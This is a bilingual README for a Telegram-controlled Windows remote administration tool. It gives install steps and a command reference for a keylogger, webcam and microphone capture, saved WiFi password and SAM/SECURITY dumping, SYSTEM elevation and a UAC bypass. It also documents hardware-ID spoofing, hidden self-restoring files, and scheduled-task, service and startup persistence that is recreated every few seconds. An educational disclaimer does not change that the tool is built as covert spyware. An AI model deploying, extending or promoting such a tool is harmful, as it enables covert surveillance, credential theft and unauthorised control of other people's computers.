# 🤖 windows-telegram-bot


<div align="center">

[![Platform](https://img.shields.io/badge/platform-Windows-blue?logo=windows&logoColor=white)](https://www.microsoft.com/windows)
[![Language](https://img.shields.io/badge/language-Python%203-3776AB?logo=python)](https://www.python.org/)
[![License](https://img.shields.io/badge/license-MIT-green)](LICENSE)
[![Commands](https://img.shields.io/badge/commands-73-brightgreen)]()
[![Lines](https://img.shields.io/badge/lines-6,848-orange)]()

*Advanced Telegram-based Remote Administration Tool for Windows*

</div>

---

## ⚠️ Legal Disclaimer

**This software is intended for educational purposes and authorized system administration only.**

- ✅ **Allowed use**: Managing your own devices, penetration testing with explicit written consent, educational research
- ❌ **Prohibited use**: Unauthorized access to computer systems, violating privacy laws, any illegal activities

**The author assumes no responsibility for misuse of this software.**

---

## 📖 Table of Contents | Оглавление

- [English](#english)
  - [📋 Overview](#-overview)
  - [✨ Features](#-features)
  - [🚀 Quick Start](#-quick-start)
  - [📁 File Structure](#-file-structure)
  - [🔐 Security & Encryption](#-security--encryption)
  - [📚 Command Reference](#-command-reference)
  - [⚙️ Configuration](#️-configuration)
  - [🛡️ Persistence Mechanisms](#️-persistence-mechanisms)

- [Русский](#русский)
  - [📋 Обзор](#-обзор)
  - [✨ Возможности](#-возможности)
  - [🚀 Быстрый старт](#-быстрый-старт)
  - [📁 Структура файлов](#-структура-файлов)
  - [🔐 Безопасность и шифрование](#-безопасность-и-шифрование)
  - [📚 Справочник команд](#-справочник-команд)
  - [⚙️ Конфигурация](#️-конфигурация)
  - [🛡️ Механизмы персистентности](#️-механизмы-персистентности)

---

# English

## 📋 Overview

**Windows Telegram Bot** is a comprehensive remote administration tool that provides **full system control** through Telegram messenger.

### Key Capabilities

| Category | Capabilities |
|----------|-------------|
| **System Control** | Reboot, shutdown, hibernate, sleep, logout, process management, SYSTEM rights escalation |
| **File System** | Browse, upload, download, create, delete, hide, unhide, zip, file editing (chg), volume mount/umount |
| **Network** | IP config with geolocation, route table, ARP cache, netstat, WiFi scanning/passwords, website blocking |
| **Registry** | Full registry access: create, read, write, delete, enum keys/values, load/unload hives, delete tree |
| **Group Policy** | Local Group Policy management (machine/user policies, create/delete/query) |
| **Services & Tasks** | Windows services (create/delete/start/stop/mode change) and Task Scheduler (6 trigger types) |
| **Device Manager** | Device enumeration, driver install/delete, enable/disable/restart, hardware spoofing (CPU, BIOS, OS, etc.) |
| **User Interface** | Screenshot, webcam capture, audio record/play, mouse (full control), keyboard (layout/remap/block), image display |
| **Surveillance** | Keylogger (multilingual EN/RU/UA with navigation parsing), clipboard monitoring |
| **Persistence** | Task Scheduler, services, startup (registry + folder), environment variables, internal autostart |
| **Security** | User management (CRUD, groups, admin), app blocking, website blocking, SAM/SECURITY dump |
| **Information** | Full systeminfo (CPU, GPU, RAM, disks, battery, BIOS, firmware, users, volumes, etc.) |

## ✨ Features

### Core Features

| Feature | Description |
|---------|-------------|
| 🔐 **Password Protection** | SHA256 password hash verification with encrypted session files |
| 🔑 **Session Management** | Two-tier: encrypted anonymous files on disk + in-memory cache with pre-bound `send()` |
| 🛡️ **Admin Elevation** | Automatic UAC bypass via `ShellExecute('runas', ...)` |
| 🔄 **Self-Healing** | Auto-recovery from crashes, file corruption, task recreation every 3 seconds |
| 🎨 **Formatted Output** | All tables rendered via `tabulate` with grid format |
| 📄 **File Transfer** | Upload/download any file size via Telegram documents |
| 🔒 **Encrypted Storage** | Custom XOR stream cipher with feedback mutation for all sensitive data |
| 🧵 **Multi-Threaded** | 4 worker threads for parallel command processing |

### Unique Technical Features

| Feature | Description |
|---------|-------------|
| **Device Spoofer** | Change CPU name, BIOS info, OS version, GPU details through registry — bypasses HWID checks |
| **Registry Hive Loader** | Load/unload offline registry hives (requires SYSTEM) |
| **Volume Manager** | Enumerate Windows volumes, mount/unmount via `SetVolumeMountPointW` |
| **In-Memory ZIP Archiver** | Creates ZIP in `BytesIO` with `compresslevel=9`, size limits, no temp files |
| **Regex Command Parser** | Cached compiled patterns with O(1) lookup for repeat commands |
| **Lazy Error Stubs** | Missing libraries produce clear errors only on actual use, not at startup |
| **Anonymous Sessions** | Disk files contain only encrypted dates — no usernames stored permanently |
| **File Timestamp Manipulation** | Change access/modify times via `os.utime` with Unix timestamps or date strings |
| **Startup Status Control** | Enable/disable startup entries with dynamic FILETIME timestamps |

### System Commands

| Command | Description |
|---------|-------------|
| `systeminfo` | Full hardware/software inventory (CPU, GPU, RAM, disks, battery, BIOS, firmware, volumes, users) |
| `dxdiag` | DirectX diagnostic information |
| `device` | Device Manager: list, query, install/delete driver, enable/disable/restart, HWID spoofing, print |
| `reg` | Registry: info, load/unload, delete tree, create key/value, delete, get, enum with 9 types |
| `gpedit` | Group Policy: enum keys/policies, get, create, delete, update |
| `service` | Services: list, query, create, delete, start/stop/restart, mode change |
| `task` | Task Scheduler: list, query, create (6 triggers), delete, enable/disable, start, stop |
| `startup` | Startup items: list, query, create, delete, enable/disable, start, stop |
| `app` | Applications: list installed, uninstall, block/unblock |
| `env` | Environment: get, query, set, create (machine/user/volatile), delete |
| `lang` | Languages: list, install, delete, set |
| `user` | Users: list, query, create, delete, password, admin, groups, enable/disable |
| `ps` | Process list with PID, CPU%, MEM, runtime, window title, status |
| `kill` | Terminate process by PID or name |
| `run` | Launch applications/files with arguments and window mode |
| `cmd` / `powershell` | Execute commands with/without output |
| `eventlog` | Windows Event Log viewer (all channels) |
| `time` / `date` | Get/set system time/date |
| `logout` / `hibernate` / `sleep` / `reboot` / `shutdown` | Power management |

### File System Commands

| Command | Description |
|---------|-------------|
| `pwd` / `cd` | Navigate directories |
| `ls` | List files with type, hidden, owner, size, time |
| `mount` | Volume enumeration, mount/unmount |
| `mkfile` / `mkdir` | Create files/directories |
| `chg` | Edit files (set/delete values, change timestamps) |
| `rn` | Rename files/directories |
| `rm` / `rmdir` | Delete files/directories |
| `cp` / `mv` | Copy/move files |
| `hide` / `unhide` | Hide/unhide files (`FILE_ATTRIBUTE_HIDDEN`) |
| `cat` | Download files (with 49 MiB limit) |
| `zip` | Create ZIP archive (25 MB per file, 49 MB total) |

### User Interface Commands

| Command | Description |
|---------|-------------|
| `screen` | Screenshot, wallpaper change, screen on/off |
| `webcam` | Webcam capture (PNG) |
| `audio` | Record microphone, play audio file |
| `img` | Display image via OpenCV |
| `mouse` | Position, move, display cursor, trail, cursors, sensitivity, speed, click, swap buttons, scroll |
| `keyboard` | Layout, speed, delay, type, press key, remap, block, reset |
| `clipboard` | Read/write/clear clipboard |
| `msg` | 5 message types: push (winotify), system, info, warning, error (MessageBox) |
| `keylogger` | Enable/disable/retrieve keystrokes with 4 output modes |

### Keylogger Features

- **Multilingual**: Full support for English, Russian, Ukrainian layouts
- **Smart Parsing**: Handles Ctrl+Arrow word jumps, Backspace, Delete, Home, End
- **Output Modes**:
  - `base` — Raw with hotkey tags
  - `char` — Characters only
  - `hotkey` — With hotkey tags only
  - `no hotkey` — Clean text without any tags
- **Layout Encoding**: Stores init layout + current layout + scan code for each key
- **Encrypted Storage**: All keystrokes encrypted with custom XOR cipher

## 🚀 Quick Start

### 📋 Prerequisites

- Windows 7/8/10/11
- Python 3.8+
- Administrator rights

### 📥 Installation

```bash
git clone https://github.com/vk-candpython/windows-telegram-bot.git
cd windows-telegram-bot
pip install -r requirements.txt
```

### ⚙️ Configuration

Edit `bot.py` and set:

```python
#-------------------------|NECESSARILY|-------------------------#
TOKEN = "YOUR_BOT_TOKEN"           # From @BotFather
PASSWORD = "YOUR_PASSWORD_HASH"    # SHA256 of your password
SEED = 12345                       # Random seed for encryption
PATH = "C:\\ProgramData\\MyBot"    # Installation directory
#-----------------------------|END|-----------------------------#

#-------------------------|OPTIONAL|-------------------------#
BOT_TASK_NAME = "MyBot"            # Task Scheduler name
BOT_TASK_DESCRIPTION = "My Bot"    # Task description
BOT_EXE = True                     # Run as persistent task
#----------------------------|END|---------------------------#
```

### 🔐 Generate Password Hash

```bash
python -c "from hashlib import sha256; print(sha256('YOUR_PASSWORD'.encode()).hexdigest())"
```

### 🏃 Run

```bash
# As Administrator
python bot.py
```

## 📁 File Structure

```
{PATH}\                              # e.g., C:\ProgramData\MyBot (hidden)
├── bot.py                           # Main script
├── mem\                             # Session storage (encrypted, anonymous)
│   └── {sha256_hash}                # One file per verified user
├── sys\                             # System files
│   ├── conf\                        # Encrypted configs
│   │   ├── 0                        # TOKEN (encrypted)
│   │   ├── 1                        # PASSWORD (encrypted)
│   │   └── 2                        # SEED
│   ├── 0                            # Restart flag
│   ├── 1                            # Autostart entries (encrypted, \u200B-separated)
│   └── 2                            # Keylogger enable flag
├── tmp\                             # Temporary files
│   ├── 0                            # Blocked apps list (encrypted)
│   ├── 1                            # Keylogger data (encrypted, \u200F-separated)
│   └── 2.txt                        # DxDiag output
└── share\                           # Uploaded/downloaded files
```

### Recovery System

| Path | Purpose |
|------|---------|
| `{PATH}\{BOT_FILE_NAME}` | Main bot file (hidden) |
| `%TEMP%\._{BOT_FILE_NAME}` | Recovery copy (hidden) |

Both monitored and restored every 3 seconds by `setup()`.

## 🔐 Security & Encryption

### Encryption Algorithm

**Properties:**
- Each encrypted byte depends on: key, position, and previous ciphertext
- Feedback creates avalanche effect
- Key from `SEED` → `(randint(1,8), randint(1,256))`

**What is encrypted:** TOKEN, PASSWORD, session files, keylogger data, autostart config, blocked apps list.

### Session Model

| Storage | Contents | Lifetime |
|---------|----------|----------|
| **Disk** (`mem\`) | Encrypted registration date only (anonymous) | Persistent |
| **RAM** (`SESSION` dict) | @username, session date, pre-bound `send()` function | Until restart/exit |

**Why:** Disk files are anonymous — no usernames. User data lives only in volatile memory.

## 📚 Command Reference

### Core Commands

| Command | Syntax | Example |
|---------|--------|---------|
| `help` | `help` | Shows all commands |
| `session` | `session` | Session information |
| `getpid` | `getpid` | Current PID |
| `getuid` | `getuid` | Current user |
| `getsystem` | `getsystem` | Elevate to SYSTEM |
| `restart` | `restart` | Restart bot |
| `exit` | `exit` | Log out |
| `repeat` | `repeat (cmd) -c (n) -d (sec)` | Repeat command N times |

### File System Examples

```bash
ls                              # List directory
ls C:\Users                     # List specific directory
cd C:\Windows                   # Change directory
mount -g                        # List volumes
mount -m \\?\Volume{...} -p C:\mount  # Mount volume
mount -u C:\mount               # Unmount volume
mkfile test.txt -d Hello\tWorld\n  # Create file with content
mkdir new_folder                # Create directory
chg -s C:\hosts -p old -v new  # Replace text in file
chg -d C:\hosts -p badline     # Delete line from file
chg -t file.txt -a 1714234567 -m none  # Change access time only
chg -t file.txt -a none -m "01.05.2026 15:30:00"  # Change modify time
rn old.txt -n new.txt           # Rename
cp source.txt -t C:\dest\       # Copy
mv source.txt -t C:\dest\       # Move
hide secret.txt                 # Hide file
unhide secret.txt               # Unhide file
cat document.pdf                # Download file
zip C:\Users                    # Create ZIP archive
```

### Network Examples

```bash
ipconfig                        # Global IP + interfaces
route                           # Routing tables
arp                             # ARP cache
netstat                         # Active connections
wifi -g                         # Scan WiFi networks
wifi -p                         # Get saved WiFi passwords
site -p https://example.com     # Open website
site -d URL -n file.pdf         # Download from URL
site -b example.com             # Block website
site -l                         # List blocked sites
```

### Registry Examples

```bash
reg -i                          # Registry info
reg -l HKLM -p C:\SAM           # Load hive (SYSTEM required)
reg -u HKLM\MyHive              # Unload hive
reg -t HKLM\MyKey               # Delete tree
reg -c HKCU\SW\MyApp -n Settings  # Create key
reg -c HKCU\SW\MyApp -n Ver -v "1.0" -t sz  # Create string value
reg -c HKCU\SW\MyApp -n List -v "a\0b\0c" -t multi_sz  # Create multi-string
reg -d -k HKCU\SW\MyApp -n SubKey  # Delete key
reg -d -v HKCU\SW\MyApp -n Ver   # Delete value
reg -g HKCU\SW\MyApp -n Ver     # Get value
reg -e -k HKLM\SOFTWARE         # Enum keys
reg -e -v HKCU\SW\MyApp         # Enum values
```

### Device Manager Examples

```bash
device -g                       # List all devices
device -q "PCI\VEN_8086&..."    # Query device
device -i driver C:\drv.inf     # Install driver
device -s device "PCI\..."      # Delete device
device -s driver oem0.inf       # Delete driver
device -e "PCI\..."             # Enable device
device -r "PCI\..."             # Restart device
device -d "PCI\..."             # Disable device
device -v device_name "PCI\..." # Get device name
device -v cpu                   # Get CPU name
device -c cpu -n "Intel Core i9-14900K"  # Spoof CPU name
device -c bios_vendor -n "Custom BIOS"   # Spoof BIOS vendor
device -u                       # Update device configuration
device -p C:\doc.pdf            # Print file
```

### Service Examples

```bash
service -g                      # List all services
service -q MyService            # Service details
service -c MySvc -n "Name" -d "Desc" -p C:\app.exe -a "args" -m autostart  # Create
service -d MyService            # Delete
service -m manual MyService     # Change start type
service -l MyService            # Start
service -r MyService            # Restart
service -s MyService            # Stop
```

### Task Scheduler Examples

```bash
task -g                         # List all tasks
task -q MyTask                  # Task details
task -c system MyTask -d "Desc" -p C:\s.bat -a none -h true -e startup  # Create
task -c user MyTask -d "Desc" -p C:\s.bat -a none -h true -e time 1991-02-20T00:00:00
task -c users MyTask -d "Desc" -p C:\s.bat -a none -h true -e logon
task -d MyTask                  # Delete
task -m enable MyTask           # Enable
task -l MyTask -a "-flag"       # Start
task -s MyTask                  # Stop
```

### User Interface Examples

```bash
screen -s                       # Screenshot
screen -e                       # Turn on screen
screen -d                       # Turn off screen
screen -w C:\wall.jpg           # Change wallpaper
webcam                          # Webcam capture
audio 10                        # Record 10 seconds
audio -p C:\music.mp3           # Play audio file
img C:\photo.png                # Display image
mouse -p                        # Get position
mouse -d true                   # Show cursor
mouse -t 3                      # Set trail length
mouse -c arrow C:\arrow.cur ibeam C:\beam.cur hand C:\hand.cur wait C:\wait.cur
mouse -x 500 -y 300 -d 1        # Move mouse
mouse -f 10                     # Set sensitivity (1-20)
mouse -v 1                      # Set speed (0/1/2)
mouse -l -c 2 -d 1              # Left click 2 times
mouse -b true                   # Swap buttons
mouse -s 3                      # Scroll down
keyboard -l                     # Get current layout
keyboard -s ru                  # Set Russian layout
keyboard -v 15                  # Set speed (1-31)
keyboard -d 1                   # Set delay (0-3)
keyboard -t "Hello" -d 1        # Type text
keyboard -k enter -p 3 -d 1     # Press Enter 3 times
keyboard -c -k a -n b           # Remap key A → B
keyboard -b f12                 # Block key
keyboard -r                     # Reset keyboard
clipboard -g                    # Get clipboard
clipboard -c "text"             # Copy to clipboard
clipboard -r                    # Clear clipboard
msg -p "Title" -t "Message"     # Push notification
msg -s "Title" -t "Message"     # System modal
msg -i "Title" -t "Message"     # Information box
msg -w "Title" -t "Message"     # Warning box
msg -e "Title" -t "Message"     # Error box
```

### Keylogger Examples

```bash
keylogger -e                    # Enable
keylogger -s                    # Status
keylogger -g base               # Raw data with hotkey tags
keylogger -g char               # Characters only
keylogger -g hotkey             # Hotkey tags only
keylogger -g no hotkey          # Clean text
keylogger -d                    # Disable
keylogger -r                    # Clear data
```

## ⚙️ Configuration

### Runtime Config Changes

```bash
config -g                       # View current config
config TOKEN -s NEW_TOKEN       # Change TOKEN (validates via API)
config PASSWORD -s newpass      # Change PASSWORD (auto-hashed)
config SEED -s 54321            # Change SEED (numeric only)
config -r TOKEN                 # Reset TOKEN
config -r PASSWORD              # Reset PASSWORD
config -r SEED                  # Reset SEED
```

### Account Management

```bash
account -g                      # List connected accounts (with session + registration dates)
account -d 123456789            # Delete account (disk + RAM)
```

## 🛡️ Persistence Mechanisms

### 1. Task Scheduler (BOT_EXE=True)

Creates task that runs every minute:
- User: SYSTEM or current user
- Hidden: true
- Priority: 7 (highest)
- Allows demand start
- No battery/idle restrictions
- Monitored and recreated every 3 seconds

### 2. Internal Autostart

Encrypted autostart config in `sys\1`:

```bash
autostart -c name -p C:\app.exe -a "args" -w true    # Add
autostart -l                                           # List (with window mode)
autostart -d name                                      # Delete
autostart -r                                           # Reset all
```

### 3. Windows Startup (Registry + Folder)

```bash
startup -c machine MyApp -p C:\app.exe -a none        # Create
startup -g                                            # List (machine + user)
startup -q machine MyApp                              # Query
startup -d machine MyApp                              # Delete
startup -m machine enable MyApp                       # Enable
startup -m machine disable MyApp                      # Disable (with dynamic FILETIME)
startup -l machine MyApp                              # Start now
startup -s machine MyApp                              # Stop (kill process)
```

### 4. Windows Services

```bash
service -c MySvc -n "Name" -d "Desc" -p C:\app.exe -a "args" -m autostart  # Create
service -d MySvc                                                                 # Delete
service -m manual MySvc                                                          # Change start type
```

### 5. Environment Variables

```bash
env -c machine MYVAR -v "value" -t sz   # Set machine-level
env -c user MYVAR -v "value" -t sz      # Set user-level
env -c tmp MYVAR -v "value" -t sz       # Set volatile
env -d machine MYVAR                    # Delete
```

---

# Русский

## 📋 Обзор

**Windows Telegram Bot** — это комплексный инструмент удалённого администрирования, предоставляющий **полный контроль над системой** Windows через мессенджер Telegram.

### Ключевые возможности

| Категория | Возможности |
|-----------|-------------|
| **Управление системой** | Перезагрузка, выключение, гибернация, сон, выход, управление процессами, SYSTEM-права |
| **Файловая система** | Навигация, загрузка, скачивание, создание, удаление, скрытие, архивация, редактирование, монтирование томов |
| **Сеть** | IP с геолокацией, таблицы маршрутизации, ARP, netstat, WiFi (сканирование/пароли), блокировка сайтов |
| **Реестр** | Полный доступ: создание, чтение, запись, удаление, перечисление, загрузка/выгрузка кустов, удаление дерева |
| **Групповые политики** | Управление локальными политиками (machine/user) |
| **Службы и задачи** | Службы Windows и Планировщик задач (6 типов триггеров) |
| **Диспетчер устройств** | Перечисление, драйверы, вкл/выкл/перезапуск, спуфинг железа (CPU, BIOS, OS и др.) |
| **Интерфейс** | Скриншоты, веб-камера, запись/воспроизведение звука, мышь (полное управление), клавиатура, изображения |
| **Наблюдение** | Кейлоггер (многоязычный EN/RU/UA с навигацией), буфер обмена |
| **Персистентность** | Планировщик, службы, автозагрузка (реестр + папки), переменные окружения, внутренний автозапуск |
| **Безопасность** | Пользователи, блокировка приложений/сайтов, дамп SAM/SECURITY |

## ✨ Возможности

### Основные возможности

| Возможность | Описание |
|-------------|----------|
| 🔐 **Защита паролем** | SHA256 + зашифрованные файлы сессий |
| 🔑 **Управление сессиями** | Два уровня: анонимные файлы на диске + кеш в ОЗУ с `send()` |
| 🛡️ **Повышение прав** | Автоматический UAC bypass через `ShellExecute('runas', ...)` |
| 🔄 **Самовосстановление** | Мониторинг файлов и задачи каждые 3 секунды |
| 🔒 **Шифрованное хранение** | XOR-шифр с обратной связью |

## 🚀 Быстрый старт

```bash
git clone https://github.com/vk-candpython/windows-telegram-bot.git
cd windows-telegram-bot
pip install -r requirements.txt
python bot.py
```

## 📚 Справочник команд

### Реестр

```bash
reg -c HKCU\Software\MyApp -n Settings           # Создать ключ
reg -c HKCU\Software\MyApp -n Ver -v "1.0" -t sz # Создать значение
reg -g HKCU\Software\MyApp -n Ver                # Получить значение
reg -e -v HKCU\Software\MyApp                    # Перечислить значения
reg -d -v HKCU\Software\MyApp -n Ver             # Удалить значение
```

### Устройства

```bash
device -g                    # Список устройств
device -q "PCI\VEN_8086"     # Информация
device -v cpu                # CPU имя
device -c cpu -n "Intel i9"  # Спуфинг CPU
device -e "PCI\..."          # Включить
device -d "PCI\..."          # Выключить
```

### Кейлоггер

```bash
keylogger -e        # Включить
keylogger -s        # Статус
keylogger -g char   # Только символы
keylogger -d        # Выключить
keylogger -r        # Очистить
```

---

<div align="center">

**[⬆ Back to Top](#-windows-telegram-bot)**

*Remote Administration via Telegram — Full Windows Control*

</div>
